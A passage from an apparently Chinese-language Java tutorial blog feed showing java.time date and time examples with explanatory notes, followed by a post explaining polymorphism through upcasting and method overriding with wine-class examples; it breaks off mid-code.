&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">          System.out.println(<span class="string">&quot;对不起，今天不是你的生日&quot;</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      System.out.println(<span class="string">&quot;-----------------------------&quot;</span>);</span><br><span class="line">      LocalTime localTime = LocalTime.now();</span><br><span class="line">      System.out.println(<span class="string">&quot;现在的时间是&quot;</span>+localTime);</span><br><span class="line">      System.out.println(<span class="string">&quot;-----------------------------&quot;</span>);</span><br><span class="line">      LocalTime twoHourLaterTime = localTime.plusHours(<span class="number">2</span>);</span><br><span class="line">      System.out.println(<span class="string">&quot;当前时间两小时后的时间是&quot;</span>+twoHourLaterTime);</span><br><span class="line">      System.out.println(<span class="string">&quot;-----------------------------&quot;</span>);</span><br><span class="line">      LocalDate oneWeekLaterDate = today.plus(<span class="number">1</span>,ChronoUnit.WEEKS);</span><br><span class="line">      System.out.println(<span class="string">&quot;两周后的日期是：&quot;</span>+oneWeekLaterDate);</span><br><span class="line">      System.out.println(<span class="string">&quot;-----------------------------&quot;</span>);</span><br><span class="line">      LocalDate oneYearBeforeDate = today.minus(<span class="number">1</span>, ChronoUnit.YEARS);</span><br><span class="line">      System.out.println(<span class="string">&quot;一年前的日期是：&quot;</span>+oneYearBeforeDate);</span><br><span class="line">      LocalDate oneYearLaterDate = today.plus(<span class="number">1</span>, ChronoUnit.YEARS);</span><br><span class="line">      System.out.println(<span class="string">&quot;一年后的日期是：&quot;</span>+oneYearLaterDate);</span><br><span class="line">      System.out.println(<span class="string">&quot;-----------------------------&quot;</span>);</span><br><span class="line">      Clock clock = Clock.systemUTC();</span><br><span class="line">      System.out.println(<span class="string">&quot;Clock:&quot;</span>+clock);</span><br><span class="line">      Clock.systemDefaultZone();</span><br><span class="line">      System.out.println(<span class="string">&quot;Clock:&quot;</span>+clock.millis());</span><br><span class="line">      System.out.println(<span class="string">&quot;-----------------------------&quot;</span>);</span><br><span class="line">      LocalDate day1 = LocalDate.of(<span class="number">2011</span>, <span class="number">12</span>, <span class="number">15</span>);</span><br><span class="line">      LocalDate day2 = LocalDate.of(<span class="number">2011</span>, <span class="number">9</span>, <span class="number">17</span>);</span><br><span class="line">      System.out.println(<span class="string">&quot;day1是否在day2之后：&quot;</span>+day1.isAfter(day2));</span><br><span class="line">      System.out.println(<span class="string">&quot;day1是否在day2之前：&quot;</span>+day1.isBefore(day2));</span><br><span class="line">      System.out.println(<span class="string">&quot;-----------------------------&quot;</span>);</span><br><span class="line">      LocalDateTime todaytime = LocalDateTime.now();</span><br><span class="line">      System.out.println(<span class="string">&quot;当前的日期时间：&quot;</span>+todaytime);</span><br><span class="line">      ZoneId zone = ZoneId.of(ZoneId.SHORT_IDS.get(<span class="string">&quot;ACT&quot;</span>));</span><br><span class="line">      ZonedDateTime dateandtimeinNewYork = ZonedDateTime.of(todaytime, zone);</span><br><span class="line">      System.out.println(<span class="string">&quot;现在时区的时间在特定时区的时间：&quot;</span>+dateandtimeinNewYork);</span><br><span class="line">      System.out.println(<span class="string">&quot;-----------------------------&quot;</span>);</span><br><span class="line">      YearMonth currentYearMonth = YearMonth.now();</span><br><span class="line">      System.out.println(<span class="string">&quot;今年的当前月&quot;</span>+currentYearMonth+<span class="string">&quot;有&quot;</span>+currentYearMonth.lengthOfMonth()+<span class="string">&quot;天&quot;</span>);</span><br><span class="line">      YearMonth creditCardExpiry = YearMonth.of(<span class="number">2018</span>, Month.FEBRUARY);</span><br><span class="line">      System.out.println(<span class="string">&quot;您输入的年月日期是：&quot;</span>+creditCardExpiry);</span><br><span class="line">      System.out.println(<span class="string">&quot;-----------------------------&quot;</span>);</span><br><span class="line">      System.out.println(<span class="string">&quot;今年&quot;</span>+today+<span class="string">&quot;是否是闰年：&quot;</span>+today.isLeapYear());</span><br><span class="line">      System.out.println(<span class="string">&quot;-----------------------------&quot;</span>);</span><br><span class="line">      LocalDate day3 = LocalDate.of(<span class="number">2002</span>, <span class="number">12</span>, <span class="number">10</span>);</span><br><span class="line">      LocalDate day4 = LocalDate.of(<span class="number">2001</span>, <span class="number">9</span>, <span class="number">12</span>);</span><br><span class="line">      Period period = Period.between(day3, day4);</span><br><span class="line">      System.out.println(day3+<span class="string">&quot;和&quot;</span>+day4+<span class="string">&quot;之间相差&quot;</span>+period.getMonths()+<span class="string">&quot;月&quot;</span>);</span><br><span class="line">      System.out.println(<span class="string">&quot;-----------------------------&quot;</span>);</span><br><span class="line">      LocalDateTime datetime = LocalDateTime.of(<span class="number">2016</span>, Month.APRIL, <span class="number">14</span>, <span class="number">14</span>, <span class="number">02</span>, <span class="number">24</span>);</span><br><span class="line">      ZoneOffset offset = ZoneOffset.of(<span class="string">&quot;+05:30&quot;</span>);</span><br><span class="line">      OffsetDateTime offsetdatetime = OffsetDateTime.of(datetime, offset);</span><br><span class="line">      System.out.println(<span class="string">&quot;日期和时间在时区上的偏移时间：&quot;</span>+offsetdatetime);</span><br><span class="line">      System.out.println(<span class="string">&quot;-----------------------------&quot;</span>);</span><br><span class="line">      Instant timestamp = Instant.now();</span><br><span class="line">      System.out.println(<span class="string">&quot;当前时间戳：&quot;</span>+timestamp);</span><br><span class="line">      System.out.println(<span class="string">&quot;-----------------------------&quot;</span>);</span><br><span class="line">      String dayaftertommrow = <span class="string">&quot;20160205&quot;</span>;</span><br><span class="line">      LocalDate formatdate = LocalDate.parse(dayaftertommrow,DateTimeFormatter.BASIC_ISO_DATE);</span><br><span class="line">      System.out.println(dayaftertommrow+<span class="string">&quot;格式化后的日期是&quot;</span>+formatdate);</span><br><span class="line">      System.out.println(<span class="string">&quot;-----------------------------&quot;</span>);</span><br><span class="line">      String goodFriday = <span class="string">&quot;04 14 2016&quot;</span>;</span><br><span class="line">      DateTimeFormatter dateTimeFormatter = DateTimeFormatter.ofPattern(<span class="string">&quot;MM dd yyyy&quot;</span>);</span><br><span class="line">      LocalDate holiday = LocalDate.parse(goodFriday,dateTimeFormatter);</span><br><span class="line">      System.out.println(goodFriday+<span class="string">&quot;自定义格式化后的日期是&quot;</span>+holiday);</span><br><span class="line">      System.out.println(<span class="string">&quot;-----------------------------&quot;</span>);</span><br><span class="line">      DateTimeFormatter formatter = DateTimeFormatter.ofPattern(<span class="string">&quot;MM dd yyyy HH:mm a&quot;</span>);</span><br><span class="line">      String datestr = todaytime.format(formatter);</span><br><span class="line">      System.out.println(<span class="string">&quot;自定义格式化后的当前日期时间是&quot;</span>+datestr);</span><br></pre></td></tr></table></figure><h2 id="4-注意点"><a href="#4-注意点" class="headerlink" title="4.注意点"></a><strong>4.注意点</strong></h2><ul><li><p>Instant 它代表的是时间戳，比如2016-04-14T14:20:13.592Z，这可以从java.time.Clock类中获取，像这样： Instant current = Clock.system(ZoneId.of(“Asia/Tokyo”)).instant();</p></li><li><p>LocalDate 它表示的是不带时间的日期，比如2016-04-14。它可以用来存储生日，周年纪念日，入职日期等。</p></li></ul><ul><li><p>LocalTime - 它表示的是不带日期的时间</p></li><li><p>LocalDateTime - 它包含了时间与日期，不过没有带时区的偏移量</p></li><li><p>ZonedDateTime - 这是一个带时区的完整时间，它根据UTC/格林威治时间来进行时区调整</p></li><li><p>这个库的主包是java.time，里面包含了代表日期，时间，瞬时以及持续时间的类。它有两个子package，一个是java.time.foramt，这个是什么用途就很明显了，还有一个是java.time.temporal，它能从更低层面对各个字段进行访问。</p></li><li><p>时区指的是地球上共享同一标准时间的地区。每个时区都有一个唯一标识符，同时还有一个地区/城市(Asia/Tokyo)的格式以及从格林威治时间开始的一个偏移时间。比如说，东京的偏移时间就是+09:00。</p></li><li><p>OffsetDateTime类实际上包含了LocalDateTime与ZoneOffset。它用来表示一个包含格林威治时间偏移量（+/-小时：分，比如+06:00或者 -08：00）的完整的日期（年月日）及时间（时分秒，纳秒）。</p></li><li><p>DateTimeFormatter类用于在Java中进行日期的格式化与解析。与SimpleDateFormat不同，它是不可变且线程安全的，如果需要的话，可以赋值给一个静态变量。DateTimeFormatter类提供了许多预定义的格式器，你也可以自定义自己想要的格式。当然了，根据约定，它还有一个parse()方法是用于将字符串转换成日期的，如果转换期间出现任何错误，它会抛出DateTimeParseException异常。类似的，DateFormatter类也有一个用于格式化日期的format()方法，它出错的话则会抛出DateTimeException异常。</p></li><li><p>再说一句，“MMM d yyyy”与“MMm dd yyyy”这两个日期格式也略有不同，前者能识别出”Jan 2 2014”与”Jan 14 2014”这两个串，而后者如果传进来的是”Jan 2 2014”则会报错，因为它期望月份处传进来的是两个字符。为了解决这个问题，在天为个位数的情况下，你得在前面补0，比如”Jan 2 2014”应该改为”Jan 02 2014”。</p></li></ul>]]></content>
      
      
      <categories>
          
          <category> java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>多态</title>
      <link href="/%E5%A4%9A%E6%80%81/"/>
      <url>/%E5%A4%9A%E6%80%81/</url>
      
        <content type="html"><![CDATA[<a id="more"></a><h1 id="多态"><a href="#多态" class="headerlink" title="多态"></a>多态</h1><p>所谓多态就是指程序中定义的引用变量所指向的具体类型和通过该引用变量发出的方法调用在编程时并不确定，而是在程序运行期间才确定，即一个引用变量倒底会指向哪个类的实例对象，该引用变量发出的方法调用到底是哪个类中实现的方法，必须在由程序运行期间才能决定。<br>因为在程序运行时才确定具体的类，这样，不用修改源程序代码，就可以让引用变量绑定到各种不同的类实现上，从而导致该引用调用的具体方法随之改变，即不修改程序代码就可以改变程序运行时所绑定的具体代码，让程序可以选择多个运行状态，这就是多态性。</p><p>比如你是一个酒神，对酒情有独钟。某日回家发现桌上有几个杯子里面都装了白酒，从外面看我们是不可能知道这是些什么酒，只有喝了之后才能够猜出来是何种酒。你一喝，这是剑南春、再喝这是五粮液、再喝这是酒鬼酒….在这里我们可以描述成如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">酒 a = 剑南春</span><br><span class="line">酒 b = 五粮液</span><br><span class="line">酒 c = 酒鬼酒</span><br></pre></td></tr></table></figure><p>这里所表现的的就是多态。剑南春、五粮液、酒鬼酒都是酒的子类，我们只是通过酒这一个父类就能够引用不同的子类，这就是多态——我们只有在运行的时候才会知道引用变量所指向的具体实例对象。</p><p>诚然，要理解多态我们就必须要明白什么是“向上转型”。在继承中我们简单介绍了向上转型，这里就在啰嗦下：在上面的喝酒例子中，酒（Win）是父类，剑南春（JNC）、五粮液（WLY）、酒鬼酒（JGJ）是子类。我们定义如下代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">JNC a = <span class="keyword">new</span>  JNC();</span><br></pre></td></tr></table></figure><p>对于这个代码我们非常容易理解无非就是实例化了一个剑南春的对象嘛！但是这样呢？</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Wine a = <span class="keyword">new</span> JNC();</span><br></pre></td></tr></table></figure><p>在这里我们这样理解，这里定义了一个Wine 类型的a，它指向JNC对象实例。由于JNC是继承与Wine，所以JNC可以自动向上转型为Wine，所以a是可以指向JNC实例对象的。这样做存在一个非常大的好处，在继承中我们知道子类是父类的扩展，它可以提供比父类更加强大的功能，如果我们定义了一个指向子类的父类引用类型，那么它除了能够引用父类的共性外，还可以使用子类强大的功能。</p><p>但是向上转型存在一些缺憾，那就是它必定会导致一些方法和属性的丢失，而导致我们不能够获取它们。所以父类类型的引用可以调用父类中定义的所有属性和方法，对于只存在与子类中的方法和属性它就望尘莫及了。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Wine</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">fun1</span><span class="params">()</span></span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Wine 的Fun.....&quot;</span>);</span><br><span class="line">        fun2();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">fun2</span><span class="params">()</span></span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Wine 的Fun2...&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">JNC</span> <span class="keyword">extends</span> <span class="title">Wine</span></span>&#123;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@desc</span> 子类重载父类方法</span></span><br><span class="line"><span class="comment">     *        父类中不存在该方法，向上转型后，父类是不能引用该方法的</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> a</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> void</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">fun1</span><span class="params">(String a)</span></span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;JNC 的 Fun1...&quot;</span>);</span><br><span class="line">        fun2();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 子类重写父类方法</span></span><br><span class="line"><span class="comment">     * 指向子类的父类引用调用fun2时，必定是调用该方法</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">fun2</span><span class="params">()</span></span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;JNC 的Fun2...&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        Wine a = <span class="keyword">new</span> JNC();</span><br><span class="line">        a.fun1();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">-------------------------------------------------</span><br><span class="line">Output:</span><br><span class="line">Wine 的Fun.....</span><br><span class="line">JNC 的Fun2...</span><br></pre></td></tr></table></figure><p>从程序的运行结果中我们发现，a.fun1()首先是运行父类Wine中的fun1().然后再运行子类JNC中的fun2()。</p><p>分析：在这个程序中子类JNC重载了父类Wine的方法fun1()，重写fun2()，而且重载后的fun1(String a)与 fun1()不是同一个方法，由于父类中没有该方法，向上转型后会丢失该方法，所以执行JNC的Wine类型引用是不能引用fun1(String a)方法。而子类JNC重写了fun2() ，那么指向JNC的Wine引用会调用JNC中fun2()方法。</p><p>所以对于多态我们可以总结如下：</p><p>指向子类的父类引用由于向上转型了，它只能访问父类中拥有的方法和属性，而对于子类中存在而父类中不存在的方法，该引用是不能使用的，尽管是重载该方法。若子类重写了父类中的某些方法，在调用该些方法的时候，必定是使用子类中定义的这些方法（动态连接、动态调用）。</p><p>对于面向对象而已，多态分为编译时多态和运行时多态。其中编译时多态是静态的，主要是指方法的重载，它是根据参数列表的不同来区分不同的函数，通过编译之后会变成两个不同的函数，在运行时谈不上多态。而运行时多态是动态的，它是通过动态绑定来实现的，也就是我们所说的多态性。</p><h1 id="多态的实现"><a href="#多态的实现" class="headerlink" title="多态的实现"></a>多态的实现</h1><p>2.1实现条件</p><p>在刚刚开始就提到了继承在为多态的实现做了准备。子类Child继承父类Father，我们可以编写一个指向子类的父类类型引用，该引用既可以处理父类Father对象，也可以处理子类Child对象，当相同的消息发送给子类或者父类对象时，该对象就会根据自己所属的引用而执行不同的行为，这就是多态。即多态性就是相同的消息使得不同的类做出不同的响应。</p><p>Java实现多态有三个必要条件：<strong>继承、重写、向上转型。</strong></p><blockquote><ul><li>继承：在多态中必须存在有继承关系的子类和父类。</li><li>重写：子类对父类中某些方法进行重新定义，在调用这些方法时就会调用子类的方法。</li><li>向上转型：在多态中需要将子类的引用赋给父类对象，只有这样该引用才能够具备技能调用父类的方法和子类的方法。</li></ul></blockquote><p>只有满足了上述三个条件，我们才能够在同一个继承结构中使用统一的逻辑实现代码处理不同的对象，从而达到执行不同的行为。</p><p>对于Java而言，它多态的实现机制遵循一个原则：当超类对象引用变量引用子类对象时，<strong>被引用对象的类型而不是引用变量的类型决定了调用谁的成员方法，但是这个被调用的方法必须是在超类中定义过的，也就是说被子类覆盖的方法。</strong></p><p>2.2实现形式</p><p>在Java中有两种形式可以实现多态。继承和接口。</p><p>2.2.1、基于继承实现的多态</p><p>基于继承的实现机制主要表现在父类和继承该父类的一个或多个子类对某些方法的重写，多个子类对同一方法的重写可以表现出不同的行为。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Wine</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getName</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setName</span><span class="params">(String name)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Wine</span><span class="params">()</span></span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">drink</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;喝的是 &quot;</span> + getName();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 重写toString()</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">JNC</span> <span class="keyword">extends</span> <span class="title">Wine</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">JNC</span><span class="params">()</span></span>&#123;</span><br><span class="line">        setName(<span class="string">&quot;JNC&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 重写父类方法，实现多态</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">drink</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;喝的是 &quot;</span> + getName();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 重写toString()</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Wine : &quot;</span> + getName();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">JGJ</span> <span class="keyword">extends</span> <span class="title">Wine</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">JGJ</span><span class="params">()</span></span>&#123;</span><br><span class="line">        setName(<span class="string">&quot;JGJ&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 重写父类方法，实现多态</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">drink</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;喝的是 &quot;</span> + getName();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 重写toString()</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Wine : &quot;</span> + getName();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="comment">//定义父类数组</span></span><br><span class="line">        Wine[] wines = <span class="keyword">new</span> Wine[<span class="number">2</span>];</span><br><span class="line">        <span class="comment">//定义两个子类</span></span><br><span class="line">        JNC jnc = <span class="keyword">new</span> JNC();</span><br><span class="line">        JGJ jgj = <span class="keyword">new</span> JGJ();</span><br><span class="line"></span><br><span class="line">        <span class="comment">//父类引用子类对象</span></span><br><span class="line">        wines[<span class="number">0</span>] = jnc;</span><br><span class="line">        wines[<span class="number">1</span>] = jgj;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span> ; i &lt; <span class="number">2</span> ; i++)&#123;</span><br><span class="line">            System.out.println(wines[i].toString() + <span class="string">&quot;--&quot;</span> + wines[i].drink());</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(<span class="string">&quot;-------------------------------&quot;</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">OUTPUT:</span><br><span class="line">Wine : JNC--喝的是 JNC</span><br><span class="line">Wine : JGJ--喝的是 JGJ</span><br><span class="line">-------------------------------</span><br></pre></td></tr></table></figure><p>在上面的代码中JNC、JGJ继承Wine，并且重写了drink()、toString()方法，程序运行结果是调用子类中方法，输出JNC、JGJ的名称，这就是多态的表现。不同的对象可以执行相同的行为，但是他们都需要通过自己的实现方式来执行，这就要得益于向上转型了。<br>所以基于继承实现的多态可以总结如下：<strong>对于引用子类的父类类型，在处理该引用时，它适用于继承该父类的所有子类，子类对象的不同，对方法的实现也就不同，执行相同动作产生的行为也就不同。</strong></p><p>如果父类是抽象类，那么子类必须要实现父类中所有的抽象方法，这样该父类所有的子类一定存在统一的对外接口，但其内部的具体实现可以各异。这样我们就可以使用顶层类提供的统一接口来处理该层次的方法。</p><p>2.2.2、基于接口实现的多态</p><p>继承是通过重写父类的同一方法的几个不同子类来体现的，那么就可就是通过实现接口并覆盖接口中同一方法的几不同的类体现的。</p><p>在接口的多态中，指向接口的引用必须是指定这实现了该接口的一个类的实例程序，在运行时，根据对象引用的实际类型来执行对应的方法。</p><p>继承都是单继承，只能为一组相关的类提供一致的服务接口。但是接口可以是多继承多实现，它能够利用一组相关或者不相关的接口进行组合与扩充，能够对外提供一致的服务接口。所以它相对于继承来说有更好的灵活性。</p><hr><h2 id="一个难度颇高的多态的例子"><a href="#一个难度颇高的多态的例子" class="headerlink" title="一个难度颇高的多态的例子"></a>一个难度颇高的多态的例子</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">A</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">show</span><span class="params">(D obj)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> (<span class="string">&quot;A and D&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">show</span><span class="params">(A obj)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> (<span class="string">&quot;A and A&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">B</span> <span class="keyword">extends</span> <span class="title">A</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">show</span><span class="params">(B obj)</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> (<span class="string">&quot;B and B&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">show</span><span class="params">(A obj)</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> (<span class="string">&quot;B and A&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">C</span> <span class="keyword">extends</span> <span class="title">B</span></span>&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">D</span> <span class="keyword">extends</span> <span class="title">B</span></span>&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> 